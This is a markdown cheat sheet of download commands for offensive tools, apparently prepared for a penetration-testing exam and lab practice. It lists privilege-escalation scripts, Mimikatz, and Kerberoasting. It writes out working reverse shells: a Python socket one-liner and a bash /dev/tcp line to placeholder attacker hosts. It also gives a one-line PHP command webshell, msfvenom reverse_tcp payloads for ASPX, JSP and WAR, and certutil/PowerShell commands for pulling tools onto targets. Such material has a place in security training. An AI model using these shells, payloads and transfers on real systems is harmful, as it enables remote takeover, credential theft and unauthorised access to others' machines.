# Pentest Tool Downloads

> **Note:** The exam Kali instance may already have some of these pre-installed. Run `which [tool]` or `find / -name [tool] 2>/dev/null` before downloading. If outbound internet is blocked in the exam, these won't work — but they're useful for lab prep and TryHackMe/INE practice.

## Privilege Escalation — Linux

```bash
# LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum.sh
chmod +x LinEnum.sh

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh

# Linux Smart Enumeration (lse)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -O lse.sh
chmod +x lse.sh

# pspy — monitor processes without root (cron job detection)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O pspy64
chmod +x pspy64
```

## Privilege Escalation — Windows

```bash
# WinPEAS (x64)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O winPEASx64.exe

# WinPEAS (x86)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O winPEASx86.exe

# PrintSpoofer (SeImpersonate → SYSTEM)
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -O PrintSpoofer64.exe

# PowerUp (PowerShell privesc)
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -O PowerUp.ps1

# PrivescCheck (PowerShell)
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 -O PrivescCheck.ps1

# JAWS (Windows enum)
wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -O jaws-enum.ps1

# Invoke-Kerberoast
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -O Invoke-Kerberoast.ps1

# Seatbelt (C# host survey — compiled)
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe -O Seatbelt.exe

# UACMe (UAC bypass — need specific release)
# https://github.com/hfiref0x/UACME — compile or find prebuilt Akagi64.exe
```

## Enumeration

```bash
# enum4linux-ng (Python rewrite, better output)
wget https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/enum4linux-ng.py -O enum4linux-ng.py
pip install impacket ldap3 pyyaml --break-system-packages 2>/dev/null

# Mimikatz (x64)
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O mimikatz.zip
unzip mimikatz.zip -d mimikatz/
```

## Reverse Shells

```bash
# PHP reverse shell (Pentest Monkey)
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
# EDIT before using: nano shell.php → change $ip and $port

# PHP simple backdoor (one-liner webshell)
# No download needed, just create:
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
# Usage: curl 'http://target/uploads/cmd.php?cmd=whoami'

# Python reverse shell one-liner (no download, paste directly):
# python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[IP]",[PORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Bash reverse shell (no download, paste directly):
# bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

# Netcat static binaries (for targets without nc)
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -O ncat
chmod +x ncat

# Windows netcat
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
```

## Webshells

```bash
# Kali built-in (already on disk):
ls /usr/share/webshells/
# /usr/share/webshells/php/php-reverse-shell.php
# /usr/share/webshells/php/simple-backdoor.php
# /usr/share/webshells/asp/
# /usr/share/webshells/aspx/

# ASP/ASPX webshell (generate with msfvenom instead):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f aspx -o shell.aspx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp -o shell.asp

# JSP webshell (for Tomcat):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -o shell.jsp

# WAR file (Tomcat manager upload):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
```

## File Transfer Helpers

```bash
# Serve files from current directory (run on attacker):
python3 -m http.server 8000

# Download on Linux target:
wget http://[IP]:8000/[file]
curl -O http://[IP]:8000/[file]

# Download on Windows target:
certutil -urlcache -f http://[IP]:8000/[file] [file]
powershell -c "Invoke-WebRequest http://[IP]:8000/[file] -OutFile [file]"

# SMB share (serve from attacker, no auth):
impacket-smbserver share . -smb2support
# On Windows target: copy \\[IP]\share\[file] C:\Temp\
```

## Quick Pre-Lab Setup

```bash
# Download everything into a tools directory:
mkdir -p ~/tools/{linux,windows,web,enum} && cd ~/tools

# Linux privesc
cd linux
wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum.sh
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x *.sh

# Windows privesc
cd ../windows
wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget -q https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
wget -q https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1

# Web
cd ../web
wget -q https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
wget -q https://github.com/int0x33/nc.exe/raw/master/nc64.exe

# Serve when needed:
cd ~/tools && python3 -m http.server 8000
```
